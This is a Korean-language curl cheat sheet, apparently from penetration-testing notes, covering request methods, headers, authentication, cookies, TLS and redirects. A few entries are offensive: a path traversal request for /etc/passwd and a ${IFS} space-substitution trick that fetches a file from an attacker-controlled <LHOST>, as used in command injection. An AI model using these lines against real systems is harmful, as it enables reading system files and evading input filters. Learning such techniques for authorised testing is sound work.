---
sidebar_position: 7
---

# curl

## 기본 사용법

```bash
# Verbose 출력
curl -v http://<DOMAIN>

# POST 메서드
curl -X POST http://<DOMAIN>

# PUT 메서드
curl -X PUT http://<DOMAIN>

# 경로 조작 (Path Traversal)
curl --path-as-is http://<DOMAIN>/../../../../../../etc/passwd

# 프록시 사용
curl --proxy http://127.0.0.1:8080 http://<DOMAIN>

# 파일 업로드
curl -F myFile=@<FILE> http://<RHOST>

# IFS (Internal Field Separator) 예제
curl${IFS}<LHOST>/<FILE>
```

## 데이터 전송

```bash
# GET 요청
curl http://<DOMAIN>

# POST 데이터
curl -X POST -d "param1=value1&param2=value2" http://<DOMAIN>

# JSON 데이터
curl -X POST -H "Content-Type: application/json" -d '{"key":"value"}' http://<DOMAIN>

# 파일에서 데이터 전송
curl -X POST -d @data.txt http://<DOMAIN>
```

## 헤더 조작

```bash
# 커스텀 헤더
curl -H "Authorization: Bearer <TOKEN>" http://<DOMAIN>
curl -H "X-Custom-Header: value" http://<DOMAIN>

# User-Agent 변경
curl -A "Mozilla/5.0" http://<DOMAIN>

# Referer 설정
curl -e "http://referrer.com" http://<DOMAIN>
```

## 인증

```bash
# Basic Auth
curl -u username:password http://<DOMAIN>

# Bearer Token
curl -H "Authorization: Bearer <TOKEN>" http://<DOMAIN>
```

## 출력 제어

```bash
# 파일로 저장
curl http://<DOMAIN> -o output.txt

# 원격 파일명으로 저장
curl -O http://<DOMAIN>/file.txt

# 진행 상황 숨기기
curl -s http://<DOMAIN>

# 에러만 표시
curl -sS http://<DOMAIN>
```

## 쿠키

```bash
# 쿠키 전송
curl -b "session=abc123" http://<DOMAIN>

# 쿠키 저장
curl -c cookies.txt http://<DOMAIN>

# 쿠키 사용
curl -b cookies.txt http://<DOMAIN>
```

## SSL/TLS

```bash
# 인증서 검증 무시
curl -k https://<DOMAIN>

# 특정 인증서 사용
curl --cert cert.pem --key key.pem https://<DOMAIN>
```

## 리다이렉트

```bash
# 리다이렉트 따라가기
curl -L http://<DOMAIN>

# 최대 리다이렉트 수
curl -L --max-redirs 5 http://<DOMAIN>
```

## 타임아웃

```bash
# 연결 타임아웃
curl --connect-timeout 10 http://<DOMAIN>

# 최대 실행 시간
curl --max-time 30 http://<DOMAIN>
```

## 참고

- -v: verbose (상세 출력)
- -X: HTTP 메서드 지정
- -H: 헤더 추가
- -d: POST 데이터
- -F: 파일 업로드 (multipart/form-data)
- -o: 출력 파일
- -k: SSL 검증 무시
- -L: 리다이렉트 따라가기
